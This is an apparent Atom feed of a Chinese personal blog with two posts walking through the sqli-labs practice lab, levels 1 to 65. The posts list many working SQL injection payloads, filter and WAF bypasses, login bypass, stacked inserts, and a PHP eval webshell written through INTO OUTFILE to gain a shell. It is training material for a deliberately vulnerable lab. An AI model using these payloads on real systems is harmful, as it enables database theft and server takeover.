<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s blog</title>
  
  <subtitle>Kage&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-17T15:15:58.054Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs通过2</title>
    <link href="http://yoursite.com/2019/08/17/sqli-labs%E9%80%9A%E8%BF%872/"/>
    <id>http://yoursite.com/2019/08/17/sqli-labs通过2/</id>
    <published>2019-08-17T15:15:58.000Z</published>
    <updated>2019-08-17T15:15:58.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p><strong>过滤了注释</strong><br>1.插入<code>\</code>判断包裹<br><code>1\</code><br>通过报错可以发现，id由<code>&#39;&#39;</code>包裹<br>2.and再次判断<br><code>1&#39; and 1=1 %23</code><br>发现报错，系统可能对注释符有过滤，再次试验<code>\*</code>、<code>--</code>、<code>#</code>都失败，应该是都过滤了<br>3.绕过过滤<br><code>1&#39; and 1=1 and &#39;1&#39;=&#39;1</code>绕过<br><code>1&#39; and 1=1 and &#39;1</code><br><code>1&#39; union select 1,2,&#39;3</code><br>可以在where后面处以True为闭合，也可以作为union的一个字段进行闭合<br>4.payload<br>(1)<code>-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata where 1 and &#39;1</code><br>(2)<code>-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#39;3</code>这个不用where</p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p><strong>二次注入</strong><br>1.测试登录页面<br>猜测语句<br><code>select * from users where username=&#39;?&#39; and password=&#39;?&#39;</code><br>注入<br><code>1\</code><br>用户名和密码都不存在注入<br>2.测试用户注册页面<br>猜测语句<br><code>insert into users(username,password) values (?,?)</code><br>注入<br><code>1&quot; and sleep(3)</code><br>用户注册界面也不存在注入<br>可以判断都进行了单引号和双引号的转义<br>3.测试修改密码页面<br>猜测语句<br><code>update users set password=? where username=&#39;?&#39;</code><br>注册一个畸形用户<br><code>admin&#39;#</code><br>数据库二次调用我们的用户名，并拼接到update语句后<br>update对自己数据的数据没进行过滤而生成二次注入，绕过mysql_real_escape。<br>因而可以实现任意用户密码修改<br><code>1&#39; or 1=1 #</code><br>可以实现所有用户密码更改</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p><strong>过滤了and与or</strong><br>1.插入<code>\</code><br>报错，可以发现id由<code>&#39;&#39;</code>包裹<br>2.and测试<br><code>1&#39; and 1=1 %23</code><br>发现and被过滤了<br>3.or测试<br><code>-1&#39; or 1 %23</code><br><code>-1&#39; or 0 %23</code><br>发现or也被过滤了<br>4.大小写绕过测试<br><code>1&#39; And 1=1 %23</code><br>无法绕过<br>5.双写绕过<br><code>1&#39; anandd 1=1 %23</code><br>成功绕过<br>6.符号绕过<br><code>1&#39; %26%26 1=2 %23</code><br>%26是&amp;，也能成功绕过<br>7.爆数据<br>information里面有or依然会被过滤，这里只有用双写绕过<br><code>-1&#39; union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata %23</code></p><h2 id="第二十五关a"><a href="#第二十五关a" class="headerlink" title="第二十五关a"></a>第二十五关a</h2><p>与第二十关类似，区别在于id没有任何包裹，并且该关没有报错<br><code>-1 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23</code></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2><p><strong>过滤了空格、注释，and、or可以绕过</strong><br>1.插入<code>\</code>被过滤了，只能插入<code>&#39;</code><br><code>1&#39;</code>，通过报错可以发现id包裹为<code>&#39;&#39;</code><br>2.再次测试是否正确<br><code>1&#39;anandd&#39;0</code><br>发现确实存在注入<br>3.第一次测试通过括号绕过空格来进行union注入，失败了<br>如：<code>SELECT * FROM users WHERE id=&#39;1&#39;union(select(1),2,3)&#39;</code><br>括号后始终有<code>&#39;</code>无法删除掉，想通过order by，但是因为是两个关键字也无能为力<br>4.只好通过空格配合报错注入进行获取数据<br><code>1&#39;anandd(select(1),updatexml(1,concat(0x7e,database(),0x7e),1),2)anandd&#39;1</code><br>5.查询database()容易，复杂查询需要配合group_concat和substr进行报错查询<br><code>1&#39;anandd(select(1),updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),30,35))from(infoorrmation_schema.schemata)),0x7e),1),2)anandd&#39;1</code><br>6.附<br>网上的payload主要是通过<code>%0A-D</code>、<code>%A0</code>、<code>%09</code>进行替换空格来获取数据，遗憾的是我的环境不行，所以只好想出上述方法</p><h2 id="第二十六关a"><a href="#第二十六关a" class="headerlink" title="第二十六关a"></a>第二十六关a</h2><p>与二十六关过滤类似，但是没有报错<br>因而我们就无法像二十六关一样使用报错注入，但是依然可以使用布尔盲注<br><code>1&#39;anandd(ascii(substr((select(substr(group_concat(schema_name),1,35))from(infoorrmation_schema.schemata)),1,1))&gt;0)anandd&#39;1</code><br>然后写脚本爆破</p><h2 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h2><p><strong>union和select和空格过滤</strong><br>union和select和双拼或者大小写绕过，payload构造思路与二十五关类似<br><code>1&#39;and(select(1),updatexml(1,concat(0x7e,(SElect(substr(group_concat(schema_name),30,35))from(information_schema.schemata)),0x7e),1),2)and&#39;1</code></p><h2 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h2><p>与二十七类似，区别在于取消报错和包裹为<code>&quot;&quot;</code><br>可以使用类似二十六关a的payload进行布尔盲注<br><code>1&quot;and(ascii(substr((SElect(substr(group_concat(schema_name),1,35))from(information_schema.schemata)),1,1))&gt;0)and&quot;1</code></p><h2 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h2><p>有点看不懂这题的过滤，感觉就是过滤了空格，题目所说的过滤union select并没看出效果<br>直接用普通的布尔盲注即可<br><code>1&#39;and(ascii(substr((select(substr(group_concat(schema_name),1,35))from(information_schema.schemata)),1,1))&gt;0)and&#39;1</code></p><h2 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h2><p>同样看不懂，感觉与二十八关一模一样<br>直接用二十八关payload即可</p><h2 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h2><p><strong>tomcat的waf</strong><br>1.测试一些垃圾字符<br><code>1&#39;</code><br>发现全都被过滤了，只有数字才能成功访问<br>2.多个参数请求绕过waf<br><code>1&amp;id=1&#39; and 1=1 %23</code><br>3.payload<br><code>id=1&amp;id=-1&#39; union select 1,database(),3 %23</code><br>4.总结<br>源码关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String id = request.getParameter(&quot;id&quot;);</span><br><span class="line">String rex = &quot;^\\d+$&quot;;</span><br></pre></td></tr></table></figure></p><p>jsp的request.getParameter只获得第一个请求参数，因而他也只对第一个参数做了正则过滤，而php对于多个参数的请求，优先获得后面一个参数的值，因而在jsp和php中存在差异，造成漏洞。</p><h2 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h2><p>与第二十九关类似，区别在于id包裹变为<code>&quot;&quot;</code>，并且不报错<br><code>1&amp;id=-1&quot; union select 1,database(),3 %23</code></p><h2 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h2><p>与第三十关类似，去吧在于id包裹变为<code>(&quot;&quot;)</code><br><code>-1&quot;) union select 1,database(),3 %23</code></p><h2 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h2><p><strong>宽字节注入</strong><br>1.各种坏字符插入<br><code>1&#39;</code><br>都能正常显示，无法注入<br>2.插入宽字节<br><code>1%bf&#39;</code><br>报错，可以得知id包裹为<code>&#39;&#39;</code><br>3.爆数据<br><code>-1%bf&#39; union select 1,database(),3 %23</code><br>4.总结<br>数据后台编码使用的如果是GBK，那么两个字节才为一个中文，同时php对于坏字符的过滤通常是在前面加注释符，因此前面拼接一个%bf可以将\吃掉。</p><h2 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h2><p>与上一关payload一样，区别在于源代码对于过滤的函数有所不同。<br><code>-1%bf&#39; union select 1,database(),3 %23</code></p><h2 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h2><p>改成post类型，原理一样<br><code>uname=-1%bf&#39; union select 1,database() %23&amp;passwd=</code></p><h2 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h2><p>与前几关类似，区别在于id没有进行包裹<br>因而那些过滤都是无效的<br><code>-1 union select 1,database(),3 %23</code></p><h2 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h2><p>和三十二关几乎一样<br><code>-1%bf&#39; union select 1,database(),3 %23</code></p><h2 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h2><p>与三十四关几乎一样<br><code>uname=-1%bf&#39; union select 1,database() %23&amp;passwd=2</code></p><h2 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h2><p><strong>堆叠注入</strong><br>操作与第一关类似，关键在于该关可以用<code>;</code>闭合然后执行任意语句，想想都恐怖。</p><h2 id="第三十九关"><a href="#第三十九关" class="headerlink" title="第三十九关"></a>第三十九关</h2><p>与三十八关一样，区别在于id没有包裹<br><code>1;insert into users(username,password) values (&#39;bu1uokage&#39;,&#39;bu1uokage&#39;)%23</code></p><h2 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关"></a>第四十关</h2><p>与三十八关一样，区别在于id包裹为<code>(&#39;&#39;)</code><br><code>1&#39;);insert into users(username,password) values (&#39;kage&#39;,&#39;kage&#39;)%23</code></p><h2 id="第四十一关"><a href="#第四十一关" class="headerlink" title="第四十一关"></a>第四十一关</h2><p>与三十八关一样，区别在于id没有包裹<br><code>1;insert into users(username,password) values (&#39;bu1uokage&#39;,&#39;bu1uokage&#39;)%23</code></p><h2 id="第四十二关"><a href="#第四十二关" class="headerlink" title="第四十二关"></a>第四十二关</h2><p>1.插入坏字符<br>username和password插入坏字符，发现报错<br>可以判断password包裹为<code>&#39;&#39;</code><br>2.堆叠注入插数据<br>    <code>login_user=&amp;login_password=1&#39; or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十三关"><a href="#第四十三关" class="headerlink" title="第四十三关"></a>第四十三关</h2><p>与第四十二关一样，区别在于password用<code>(&#39;&#39;)</code>包裹<br><code>login_user=1&amp;login_password=1&#39;) or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十四关"><a href="#第四十四关" class="headerlink" title="第四十四关"></a>第四十四关</h2><p>与第四十二关一样，区别在于没有报错<br><code>login_user=&amp;login_password=1&#39; or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十五关"><a href="#第四十五关" class="headerlink" title="第四十五关"></a>第四十五关</h2><p>与第四十三关一样，区别在于没有报错<br><code>login_user=1&amp;login_password=1&#39;) or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十六关"><a href="#第四十六关" class="headerlink" title="第四十六关"></a>第四十六关</h2><p><strong>order by 注入</strong><br>1.desc测试有无注入<br><code>1 desc</code>和<code>1 asc</code><br>存在不同，可以发现该网页存在order by注入<br>2.报错注入<br><code>(select 1,updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1),2)</code><br>3.rand(True)与rand(False)的布尔注入<br>通过判断表中第一个数据的不同可以进行注入，需要使用Beautifulsoup<br><code>rand(ascii(substr((select password from users limit 0,1),1,1))&lt;79)</code><br>4.时间注入<br><code>if(length((select password from users limit 0,1))&gt;0,sleep(5),1)</code><br>时间注入性能较低，但依然可以用<br>5.procedure analyse类型的报错注入<br><code>1%27procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)--+</code></p><h2 id="第四十七关"><a href="#第四十七关" class="headerlink" title="第四十七关"></a>第四十七关</h2><p><strong>字符串类型的order by注入</strong><br>不清楚order by后面的字段带字符串什么意思<br>1.sleep测试有无注入<br><code>1&#39; and sleep(3) %23</code><br>有延时，发现存在注入<br>2.通过报错注出数据<br><code>1&#39; and (select 1,updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1),2) %23</code><br>3.通过时间脚本注入数据<br><code>1&#39; and if(length((select password from users limit 0,1))&gt;0,sleep(5),1) %23</code></p><h2 id="第四十八关"><a href="#第四十八关" class="headerlink" title="第四十八关"></a>第四十八关</h2><p>与46关几乎一样，就是不报错了<br>除了报错注入其他方法都行<br><code>rand(length((select password from users limit 0,1))&gt;0)</code></p><h2 id="第四十九关"><a href="#第四十九关" class="headerlink" title="第四十九关"></a>第四十九关</h2><p>与第47关一样，就是不报错了<br><code>1&#39; and if(length((select password from users limit 0,1))&gt;0,sleep(5),1) %23</code></p><h2 id="第五十关"><a href="#第五十关" class="headerlink" title="第五十关"></a>第五十关</h2><p><strong>order by类型的堆叠注入</strong><br><code>1;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)</code><br>不懂堆叠注入的意义，但题目就这么出的</p><h2 id="第五十一关"><a href="#第五十一关" class="headerlink" title="第五十一关"></a>第五十一关</h2><p>还是堆叠注入，字符型的<br><code>1&#39;;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)%23</code></p><h2 id="第五十二关"><a href="#第五十二关" class="headerlink" title="第五十二关"></a>第五十二关</h2><p>还是堆叠注入<br><code>1;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)</code></p><h2 id="第五十三关"><a href="#第五十三关" class="headerlink" title="第五十三关"></a>第五十三关</h2><p>还是堆叠注入，字符型的<br><code>1&#39;;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)%23</code></p><h2 id="第五十四关"><a href="#第五十四关" class="headerlink" title="第五十四关"></a>第五十四关</h2><p>数字类型，union注入<br>table<br><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code><br>字段<br><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;e6ee4wjw6q&#39; %23</code></p><h2 id="第五十五关"><a href="#第五十五关" class="headerlink" title="第五十五关"></a>第五十五关</h2><p>()，union注入</p><h2 id="第五十六关"><a href="#第五十六关" class="headerlink" title="第五十六关"></a>第五十六关</h2><p>(‘’)，union注入</p><h2 id="第五十七关"><a href="#第五十七关" class="headerlink" title="第五十七关"></a>第五十七关</h2><p>“”，union注入</p><h2 id="第五十八关"><a href="#第五十八关" class="headerlink" title="第五十八关"></a>第五十八关</h2><p>报错注入<br><code>select 1 from (select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;s3xs3kw3kw&#39; limit 2,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b</code><br>表<br><code>select 1 from (select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b</code><br>字段<br><code>(select column_name from information_schema.columns where table_name=&#39;s3xs3kw3kw&#39; limit 2,1)</code></p><h2 id="第五十九关"><a href="#第五十九关" class="headerlink" title="第五十九关"></a>第五十九关</h2><p>与第五十九关类似，数字型报错注入</p><h2 id="第六十关"><a href="#第六十关" class="headerlink" title="第六十关"></a>第六十关</h2><p>与第五十九关类似，<code>(&quot;&quot;)</code></p><h2 id="第六十一关"><a href="#第六十一关" class="headerlink" title="第六十一关"></a>第六十一关</h2><p>有第五十九关类似，<code>((&#39;&#39;))</code></p><h2 id="第六十二关"><a href="#第六十二关" class="headerlink" title="第六十二关"></a>第六十二关</h2><p><code>(&#39;&#39;)</code>，布尔注入</p><h2 id="第六十三关"><a href="#第六十三关" class="headerlink" title="第六十三关"></a>第六十三关</h2><p><code>&#39;&#39;</code>，布尔植入</p><h2 id="第六十四关"><a href="#第六十四关" class="headerlink" title="第六十四关"></a>第六十四关</h2><p><code>(())</code>，布尔注入</p><h2 id="第六十五关"><a href="#第六十五关" class="headerlink" title="第六十五关"></a>第六十五关</h2><p><code>(&quot;&quot;)</code>，布尔注入</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第二十三关&quot;&gt;&lt;a href=&quot;#第二十三关&quot; class=&quot;headerlink&quot; title=&quot;第二十三关&quot;&gt;&lt;/a&gt;第二十三关&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;过滤了注释&lt;/strong&gt;&lt;br&gt;1.插入&lt;code&gt;\&lt;/code&gt;判断包裹&lt;br&gt;&lt;code&gt;
      
    
    </summary>
    
      <category term="技术小卖铺" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E5%8D%96%E9%93%BA/"/>
    
    
      <category term="靶场" scheme="http://yoursite.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 通关1</title>
    <link href="http://yoursite.com/2019/08/17/sqli-labs%20%E9%80%9A%E5%85%B31/"/>
    <id>http://yoursite.com/2019/08/17/sqli-labs 通关1/</id>
    <published>2019-08-17T15:15:22.000Z</published>
    <updated>2019-08-17T15:15:22.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><strong>union 注入</strong><br>1.插入转义字符查看报错<br><code>1\</code><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1<br>通过报错可以看到id是用什么包裹的</p><p>1.and判断是否存在注入<br><code>1&#39; and 1=1 %23</code><br><code>1&#39; and 1=2 %23</code><br><code>`1&#39; %26%26 1=2 %23</code></p><p>2.order by判断字段数<br>因为union注入，必须和前面查询的字段数相同<br><code>1&#39; order by 3 %23</code><br>从大到小依次测试，直到显示成功</p><p>3.判断回显位置<br><code>-1&#39; union select 1,2,3 %23</code><br>查询的id号的记录必须为空，才能回显我们自己构造的数据</p><p>4.查数据库<br><code>-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code><br>从information_schema数据库中的shcemata表中的schema_name字段查询出所有的数据库名</p><p>5.查表<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code><br>从information_schema数据库中的tables表中的table_name字段查询出所有的表名</p><p>6.查字段<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code><br>从information_schema数据库中的columns表中的column_name字段查询出所有的字段名</p><p>7.查数据<br><code>id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users%23</code><br>查询出所有数据<br><code>?id=-1&#39; union select 1,username,password from security.users limit 0,1%23</code><br>单个数据查询</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>与第一关类似，区别在于id不用加单引号<br><code>?id=-1 union select 1,username,password from security.users limit 2,1%23</code></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>与第一关类似，区别在于id用(‘’)包裹<br><code>-1&#39;) union select 1,username,password from security.users limit 0,1%23</code></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与第一关类似，区别在于id用(“”)包裹<br><code>?id=-1&quot;) union select 1,username,password from security.users limit 0,1%23</code></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p><strong>可以报错的盲注</strong><br><strong>报错注入：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p><p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p><p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p><p>4.报错注入<br>注意报错注入依然用union，所以前后字段数需要相同<br>payload1:<br><code>1&#39; union select 1 from (select 1,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %23</code></p><p>payload2:<br><code>1&#39; union select 1 from (select 1,count(*),3 from information_schema.tables group by concat(database(),floor(rand(0)*2)))b %23</code><br>该payload只是payload1的简化</p><p>payload3:<br><code>1&#39; union select 1 from (select 1,count(*),3 from (select 1 union select null union select !1) as a group by concat(database(),floor(rand(0)*2)))b %23</code><br>当关键表被禁用可以用这个形式，如information.tables</p><p>payload4:<br><code>1&#39; union select 1 from ()bselect 1,min(@a:=1),3 from information_schema.tables group by concat(database(),@a:=(@a%2b1)%2) %23</code><br><code>+</code>号需要url编码，当count(*)和rand()被禁用，可以用该payload</p><p>payload5:<br><code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e)),2 %23</code><br>extractvalue触发xpath报错注入</p><p>payload6:<br><code>1&#39; union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1),2 %23</code><br>updatexml触发xpath报错注入</p><p>payload7:<br><code>1&#39; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x %23</code><br>该payload暂时只知道用来查版本</p><p><strong>布尔盲注：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p><p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p><p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p><p>4.ascii和substr配合查询</p><blockquote><p>ascii：转换为ascii码<br>substr：substr(查询值,1,1)查询第一个字符</p></blockquote><p><code>1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0 %23</code><br>id值必须为有效字段，通过判断and后面的bool值来猜出数据的多少，true就显示数据，false就不显示数据</p><p>5.编写python脚本爆数据<br>(select schema_name from information_schema.schemata limit 0,1)</p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>与第五关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>1&quot; and ascii(substr(database(),1,1))&gt;0 %23</code></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p><strong>无报错回显的布尔盲注</strong><br>1.插入单引号和双引号<br>单引号报错，双引号不报错，可以判断有单引号包裹<br>2.构造判断语句<br><code>1&#39; and 1=1 %23</code><br>依然报错<br><code>1&#39;)) and 1=1 %23</code><br>不报错<br>可以判断id由<code>((&#39;&#39;))</code>包裹<br>3.写脚本爆数据<br>4.使用<code>into outfile</code><br>先测试<br><code>1&#39;)) and (select count(*) from mysql.user)&gt;0 %23</code><br>显然有权限，然后写入文件<br><code>-1&#39;)) union select 1,&#39;&lt;?php @eval($_post[mima])?&gt;&#39;,3 into outfile &quot;D:\\1.php&quot; %23</code><br>前提，需要知道web文件目录，然后使用菜刀连接，就可以获得shell</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>与第七关类似，区别在于id用<code>&#39;&#39;</code>包裹</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p><strong>时间注入</strong></p><ol><li>通过sleep判断id由什么包裹<br><code>1&#39; and sleep(3) %23</code><br>延迟3秒才加载完成，可以判断id由<code>&#39;&#39;</code>包裹</li></ol><p>2.通过if函数进行判断</p><blockquote><p>if(bool,执行True,执行False)</p></blockquote><p>所以构造payload<br><code>1&#39; and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0,sleep(3),1) %23</code><br>延迟3秒，注入成功。</p><p>3.编写脚本爆数据</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>与第九关类似，区别在于id用<code>&quot;&quot;</code>包裹</p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p><strong>POST类型的union注入</strong><br><strong>登录</strong><br>1.猜测语句<br><code>select * from users where username=&#39;?&#39; and password=&#39;?&#39; %23</code><br>2.在username插入<code>\</code>报错<br>可以判断username和password用<code>&#39;&#39;</code>包裹<br>3.判断是否正确<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br><code>uname=1&#39; or 1=2 %23&amp;passwd=</code><br>通过回显可以判断包裹<br>4.一句话登录<br>如果知道用户名，不用密码可以任意登录<br><code>uname=Dumb&#39; %23&amp;passwd=</code><br>不用用户名和密码，登录任意指定号数的用户<br><code>uname=1&#39; or 1=1 limit 0,1%23&amp;passwd=</code></p><p><strong>爆数据</strong><br>1.判断字段<br><code>uname=1&#39; order by 2%23&amp;passwd=</code><br>2.判断回显位置<br><code>uname=1&#39; union select 1,2%23&amp;passwd=</code><br>3.爆数据<br>payload:<code>uname=1&#39; union select database(),2%23&amp;passwd=</code></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>与第十一关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) union select database(),2%23&amp;passwd=</code></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p><strong>数据不回显，但是报错的POST注入</strong><br>登录与第十一关类似<br><strong>爆数据</strong><br>报错爆数据<br><code>uname=1&#39;) union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code><br>通过该语句写脚本爆数据<br><code>uname=1&#39;) or bool 23&amp;passwd=</code></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>与第十三关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>uname=1&quot; union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code></p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p><strong>最像登录的一关，无报错，无回显</strong><br>1.判断id用什么包裹<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br>可以发现id用<code>&#39;&#39;</code>包裹<br>2.通过bool写脚本爆数据</p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>与第十五关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) or 1=1 %23&amp;passwd=</code></p><h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><p><strong>update注入</strong><br>场景可以想象成，我们是一个用户在自己的修改密码页面，进行update注入获得数据信息<br>猜测语句<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39;</code><br>1.测试包裹情况<br><code>uname=admin&#39;&amp;passwd=1</code><br>检测到黑客攻击，应该对uname注入点防范严格<br><code>uname=admin&amp;passwd=1&#39;</code><br>出现报错，password存在注入，password应该用<code>&#39;&#39;</code>包裹<br>2.可以通过and (报错函数)进行爆数据<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>因此可以构造payload<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>对于concat类型报错，需要用<code>select 1 from (报错函数)b</code>进行构造<br>payload:<code>uname=admin&amp;passwd=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b)%23</code><br>3.时间类型注入<br><code>uname=admin&amp;passwd=2&#39; and if(length((select password from security.users limit 0,1))&gt;0,sleep(0.1),1)%23</code><br>可以写脚本爆数据，但是没法爆修改表的数据，所以有一定缺陷，不知道怎么绕过</p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p><strong>http头+insert注入</strong><br>场景：已知自己账号的情况下，服务器随意将用户浏览器添加到数据库中<br>1.看到User-Agent回显，猜测语句<br><code>insert into uagents (uagent, ip_address, username`) VALUES (&#39;?&#39;, &#39;ip&#39;, &#39;name&#39;)</code><br>判断包裹<br><code>{&#39;User-Agent&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code><br>可以发现存在注入，id包裹为<code>&#39;&#39;</code><br>2.编写脚本爆数据<br>睡眠语句应该插入在VALUES字段当中才有效果，且前面值必须为True<br>3.注<br>一般http头注入通过编写脚本会更直观一些</p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>与第十八关类似，区别在于http头为Rerferer<br><code>{&#39;Rerferer&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p><strong>使用Cookie进行查询的注入</strong><br>场景，通过cookie来查询数据库获得用户信息<br>1.测试cookie，可以发现存在越权<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&quot;}</code><br>登录为Dumb<br><code>{&#39;Cookie&#39;:&quot;uname=Admin&quot;}</code><br>登录为Admin<br>2.插入<code>\</code><br>出现报错，可以判断出id包裹为<code>&#39;&#39;</code><br>3.无法判断后台语句，可能是插入或者查询<br>我们尝试通用sleep语句来测试<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and sleep(3) #&quot;}</code><br>可以发现延迟了3秒钟，因而存在注入<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and 1=1 